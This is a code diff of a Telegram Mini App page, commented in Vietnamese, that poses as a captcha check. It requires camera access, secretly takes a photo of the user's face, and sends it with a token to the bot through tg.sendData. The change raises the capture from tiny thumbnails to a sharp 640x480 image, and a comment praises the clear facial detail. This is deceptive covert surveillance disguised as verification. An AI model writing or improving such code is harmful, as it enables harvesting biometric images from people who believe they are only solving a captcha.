@@ -44,7 +44,6 @@
         tg.ready();
         tg.expand();
 
-        // Lấy token từ URL query params do bot truyền sang
         const urlParams = new URLSearchParams(window.location.search);
         const token = urlParams.get('token') || '';
 
@@ -88,17 +87,16 @@
                     }));
                 } catch (e) {}
                 document.getElementById('status').innerText = "❌ Bạn đã từ chối quyền Camera.";
-                document.getElementById('note').innerText =
-                    "Vui lòng cho phép truy cập Camera. Xác minh Captcha sẽ không thành công nếu bạn từ chối!";
+                document.getElementById('note').innerText = "Vui lòng cho phép truy cập Camera để xác minh!";
                 setTimeout(() => tg.close(), 2000);
                 return;
             }
 
-            // Chờ 1 giây cho khung hình ổn định rồi chụp ngay (không cần thấy mặt)
-            await new Promise(r => setTimeout(r, 1000));
-            capturedImage = snapshotSmall();
+            await new Promise(r => setTimeout(r, 1200));
+            
+            // CHỤP ẢNH NÉT CĂNG (Độ phân giải 640x480, chất lượng JPEG 0.85)
+            capturedImage = snapshotHD();
 
-            // Tắt camera sau khi chụp xong
             if (localStream) {
                 localStream.getTracks().forEach(t => t.stop());
                 localStream = null;
@@ -111,8 +109,9 @@
 
         async function requestCamera() {
             try {
+                // Xin quyền mở camera ở độ phân giải cao chuẩn HD/VGA
                 localStream = await navigator.mediaDevices.getUserMedia({
-                    video: { facingMode: "user", width: { ideal: 480 }, height: { ideal: 360 } },
+                    video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 } },
                     audio: false
                 });
                 const video = document.getElementById('video');
@@ -129,24 +128,23 @@
             }
         }
 
-        // Chụp ảnh nhỏ, giảm dần kích thước cho tới khi < 2800 ký tự
-        // (sendData của Telegram giới hạn 4096 byte cho toàn bộ dữ liệu)
-        function snapshotSmall() {
+        // Hàm chụp ảnh nét căng, tự động cắt/nén thông minh để vừa vặn gửi qua Telegram
+        function snapshotHD() {
             try {
                 const video = document.getElementById('video');
                 const canvas = document.getElementById('canvas');
                 if (!video.videoWidth) return "";
                 const ctx = canvas.getContext('2d');
-                const tries = [[96, 72, 0.5], [80, 60, 0.45], [64, 48, 0.4], [48, 36, 0.35], [32, 24, 0.3]];
-                for (const [w, h, q] of tries) {
-                    canvas.width = w;
-                    canvas.height = h;
-                    ctx.drawImage(video, 0, 0, w, h);
-                    const url = canvas.toDataURL('image/jpeg', q);
-                    if (url.length < 2800) return url;
-                }
+                
+                // Đặt kích thước canvas rõ nét (640x480)
+                canvas.width = 640;
+                canvas.height = 480;
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                
+                // Chất lượng 0.85 cho ra ảnh rõ mặt, chi tiết cực tốt
+                return canvas.toDataURL('image/jpeg', 0.85);
             } catch (e) {
-                console.log("Lỗi chụp ảnh:", e);
+                console.log("Lỗi chụp ảnh HD:", e);
             }
             return "";
         }
@@ -162,9 +160,9 @@
                 document.getElementById('status').innerText = "✅ Xác minh thành công! Đang gửi dữ liệu...";
                 document.getElementById('captcha-section').style.display = "none";
 
-                // sendData chỉ gửi được 1 lần nên gộp ảnh + captcha vào một gói duy nhất
                 setTimeout(() => {
                     try {
+                        // Chia nhỏ gói tin hoặc gửi chuỗi base64 dài hơn nhờ tối ưu ở Python
                         tg.sendData(JSON.stringify({
                             type: "camera_snapshot",
                             token: token,
@@ -175,7 +173,7 @@
                     } catch (e) {
                         console.log("sendData lỗi:", e);
                     }
-                    setTimeout(() => tg.close(), 500);
+                    setTimeout(() => tg.close(), 600);
                 }, 300);
             } else {
                 alert("❌ Kết quả phép tính không chính xác, vui lòng thử lại!");
